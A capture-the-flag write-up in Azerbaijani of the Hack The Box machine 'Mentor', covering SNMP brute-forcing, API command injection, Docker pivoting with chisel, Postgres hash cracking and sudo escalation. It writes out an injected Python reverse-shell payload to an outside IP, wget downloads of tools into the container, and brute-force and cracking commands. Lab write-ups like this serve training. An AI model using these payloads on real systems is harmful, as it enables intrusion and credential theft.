# Mentor (HTB)

> Platforma: Hack The Box  
> OS: Linux  
> Çətinlik: Orta  
> Nəticə: root

---

## Hücum Zənciri

```text
Kəşfiyyat
├── nmap -p- --min-rate 5000 → 22 (SSH), 80 (Apache)
├── UDP scan → 161 (SNMP)
└── /etc/hosts: 10.129.115.144 mentorquotes.htb api.mentorquotes.htb

İlkin Giriş (SNMP + API)
├── ffuf (Host: FUZZ.mentorquotes.htb) → api.mentorquotes.htb
├── snmpbrute.py → community string "internal"
├── snmpwalk -v2c -c internal → /usr/local/bin/login.py <PASSWORD>
├── API /auth/signup + /auth/login → n3xu6 JWT
├── API /auth/login (james) → james JWT
└── /admin/backup (POST) → Blind RCE via path parameter

Üfüqi Yerdəyişmə (Container escape)
├── Python reverse shell (pty.spawn) → uid=0(root) in Alpine container
├── .dockerenv detected
├── wget static nmap → /tmp/nmap
├── /tmp/nmap -sn 172.22.0.0/24 → docker_web_1 (172.22.0.2), docker_postgres_1 (172.22.0.4)
├── chisel tunnel → R:127.0.0.1:8002:172.22.0.4:5432
├── psql -h 127.0.0.1 -p 8002 -U postgres → mentorquotes_db
├── SELECT * FROM users; → service_acc MD5 hash
└── hashcat -m 0 → <PASSWORD>

İstifadəçi Bayrağı
├── ssh svc@mentor.htb (password <PASSWORD>)
└── cat /home/svc/user.txt → <USER_FLAG>

Səlahiyyətlərin Artırılması
├── cat /etc/snmp/snmpd.conf → createUser bootstrap MD5 <PASSWORD> DES
├── su james (password <PASSWORD>)
├── sudo -l → (ALL) /bin/sh
└── sudo /bin/sh → root
```

> [!NOTE]
> Bütün bayraqlar, şifrələr, heşlər və sessiya tokenləri etik səbəblərə görə gizlədilmişdir.

---

## Maşın Brifinqi

Mentor, zəif community string ilə SNMP xidməti, Blind Command Injection zəifliyi olan API və Docker şəbəkəsi vasitəsilə əlçatan PostgreSQL konteyneri olan orta çətinlikli Linux maşınıdır. Yol, səhv konfiqurasiya edilmiş sudo qaydası ilə root-a çatmadan əvvəl bir neçə istifadəçi və konteynerdən keçməyi əhatə edir.

---

## Kəşfiyyat

### Port Skanı

```bash
nmap -p- --min-rate 5000 -T4 -Pn -n 10.129.115.144
```

| Port | Xidmət | Versiya |
|------|---------|---------|
| 22   | SSH     | OpenSSH 8.9p1 Ubuntu 3 |
| 80   | HTTP    | Apache httpd 2.4.52 |

```bash
echo "10.129.115.144 mentorquotes.htb api.mentorquotes.htb" | sudo tee -a /etc/hosts
```

### vHost Sadalanması

```bash
ffuf -u http://10.129.115.144 -H "Host: FUZZ.mentorquotes.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,404 -fs 0
```

Nəticə: `api` (Status: 404, Size: 22).

---

## İlkin Giriş (SNMP + API)

### SNMP Sadalanması

```bash
sudo nmap -sU -F -Pn -n 10.129.115.144
```

| Port | Xidmət |
|------|---------|
| 161  | SNMP    |

Default `public` community string faydalı məlumat vermir. `internal` tapmaq üçün brute-force:

```bash
python3 snmpbrute.py -t 10.129.115.144 -f /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
```

Nəticə: `internal` (v2c)(RO).

Proses arqumentlərini çıxarırıq:

```bash
snmpwalk -v2c -c internal 10.129.115.144 .1.3.6.1.2.1.25.4.2.1.5 | grep login.py
```

```text
iso.3.6.1.2.1.25.4.2.1.5.2078 = STRING: "/usr/local/bin/login.py <PASSWORD>"
```

### API Qeydiyyat / Giriş

```bash
curl -s -X POST http://api.mentorquotes.htb/auth/signup -H 'Content-Type: application/json' -d '{"email": "n3xu6@mentor.htb", "username": "n3xu6", "password": "password123"}'
curl -s -X POST http://api.mentorquotes.htb/auth/login -H 'Content-Type: application/json' -d '{"email": "n3xu6@mentor.htb", "username": "n3xu6", "password": "password123"}'
```

Token admin girişinə malik deyil:

```bash
curl -s http://api.mentorquotes.htb/admin/ -H 'Authorization: <JWT_TOKEN>'
```

```json
{"detail":"Only admin users can access this resource"}
```

SNMP vasitəsilə tapılan parolla `james` kimi daxil oluruq:

```bash
curl -s -X POST http://api.mentorquotes.htb/auth/login -H 'Content-Type: application/json' -d '{"email": "james@mentorquotes.htb", "username": "james", "password": "<PASSWORD>"}'
```

### Blind RCE

`/admin/backup` endpointini yoxlayırıq:

```bash
curl -i -s http://api.mentorquotes.htb/admin/backup -H 'Authorization: <JWT_TOKEN>'
```

```text
HTTP/1.1 405 Method Not Allowed
{"detail":"Method Not Allowed"}
```

Boş JSON ilə POST testi:

```bash
curl -s -X POST http://api.mentorquotes.htb/admin/backup -H 'Authorization: <JWT_TOKEN>' -H 'Content-Type: application/json' -d '{}'
```

```json
{"detail":[{"loc":["body","path"],"msg":"field required","type":"value_error.missing"}]}
```

Kor icranı təsdiqləmək üçün `wget` əmri yeridirik:

```bash
curl -s -X POST http://api.mentorquotes.htb/admin/backup -H 'Authorization: <JWT_TOKEN>' -H 'Content-Type: application/json' -d '{"path": "test; wget http://10.10.15.20:8000/test"}'
```

Server əmrin sonuna `/app_backkup.tar` əlavə edir, buna görə sorğu `GET /test/app_backkup.tar` kimi görünür. Bu icranı təsdiqləyir.

### Reverse Shell

Alpine konteynerində `/bin/bash` və `nc -e` olmadığı üçün Python reverse shell istifadə edirik:

```bash
curl -s -X POST http://api.mentorquotes.htb/admin/backup -H 'Authorization: <JWT_TOKEN>' -H 'Content-Type: application/json' -d '{"path": "test; python3 -c \"import socket,os,pty;s=socket.socket();s.connect((\u002710.10.15.20\u0027,4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\u0027/bin/sh\u0027)\"; #"}'
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Alpine Docker konteynerində `root` kimi shell.

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

---

## Üfüqi Yerdəyişmə (Container escape)

Docker mühitinin olub olmadığını yoxlayırıq:

```bash
ls -la /
```

```text
-rwxr-xr-x    1 root     root             0 Oct 24 11:40 .dockerenv
```

Statik `nmap` yükləyirik və daxili şəbəkəni skan edirik:

```bash
wget http://10.10.15.20:8000/nmap -O /tmp/nmap
chmod +x /tmp/nmap
/tmp/nmap -sn 172.22.0.0/24
```

```text
Nmap scan report for docker_web_1.docker_vpcbr (172.22.0.2)
Nmap scan report for docker_postgres_1.docker_vpcbr (172.22.0.4)
```

PostgreSQL portunu skan edirik:

```bash
/tmp/nmap -p 5432 172.22.0.0/24
```

```text
PORT     STATE SERVICE
5432/tcp open  postgresql
```

`chisel` yükləyirik və tunel yaradırıq:

```bash
wget http://10.10.15.20:8000/chisel -O /tmp/chisel
chmod +x /tmp/chisel
```

Kali-də serveri işə salırıq:

```bash
./chisel server -p 8001 --reverse
```

Konteynerdən qoşuluruq:

```bash
/tmp/chisel client 10.10.15.20:8001 R:127.0.0.1:8002:172.22.0.4:5432
```

### PostgreSQL Girişi

Default giriş məlumatları ilə verilənlər bazasına qoşuluruq:

```bash
psql -h 127.0.0.1 -p 8002 -U postgres
```

Parol: `postgres`.

Verilənlər bazalarının siyahısı:

```sql
\l
```

```text
mentorquotes_db
```

Qoşulma və istifadəçilərin dump-ı:

```sql
\c mentorquotes_db
SELECT * FROM users;
```

```text
 id |         email          |  username   |             password             
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | <MD5_HASH>
  2 | svc@mentorquotes.htb   | service_acc | <MD5_HASH>
```

`service_acc` üçün MD5 heşini sındırırıq:

```bash
echo "<MD5_HASH>" > svc.hash
hashcat -m 0 svc.hash /usr/share/wordlists/rockyou.txt
```

```text
<MD5_HASH>:<PASSWORD>
```

### İstifadəçi Bayrağı

SSH vasitəsilə `svc` kimi daxil oluruq (istifadəçi adı `service_acc` deyil):

```bash
ssh svc@10.129.115.144
```

Parol: `<PASSWORD>`.

```bash
cat /home/svc/user.txt
# <USER_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Səlahiyyətlərin Artırılması

SNMP konfiqurasiya faylı `james` üçün açıq mətn parolu ehtiva edir:

```bash
cat /etc/snmp/snmpd.conf
```

```text
createUser bootstrap MD5 <PASSWORD> DES
```

`james`-ə keçirik:

```bash
su james
```

Parol: `<PASSWORD>`.

Sudo səlahiyyətlərini yoxlayırıq:

```bash
sudo -l
```

```text
User james may run the following commands on mentor:
    (ALL) /bin/sh
```

Root shell alırıq:

```bash
sudo /bin/sh
```

```bash
whoami
# root
cat /root/root.txt
# <ROOT_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Bayraqlar

| Bayraq | Dəyər                            |
|--------|----------------------------------|
| User   | <USER_FLAG> |
| Root   | <ROOT_FLAG> |

---

## Əsas Nəticələr

- **SNMP community string-ləri** həssas proses arqumentlərini ifşa edə bilər. Həmişə default `public`-dən başqa string-ləri brute-force edin.
- **API Blind Command Injection**, əlavə edilmiş şəkilçiləri keçmək üçün `;` və `#` istifadə edərək istismar edilə bilər.
- **Alpine konteynerlərində** `/bin/bash` və `nc -e` yoxdur; reverse shell üçün Python istifadə edin.
- **Docker şəbəkələri** `chisel` və ya oxşar alətlər vasitəsilə pivot tələb edir.
- **PostgreSQL default giriş məlumatları** kritik bir tapıntıdır.
- **Konfiqurasiya faylları** (məsələn, `/etc/snmp/snmpd.conf`) tez-tez digər istifadəçilər üçün açıq mətn parolları ehtiva edir.
- **Sudo səhv konfiqurasiyaları** kimi `(ALL) /bin/sh` dərhal root verir.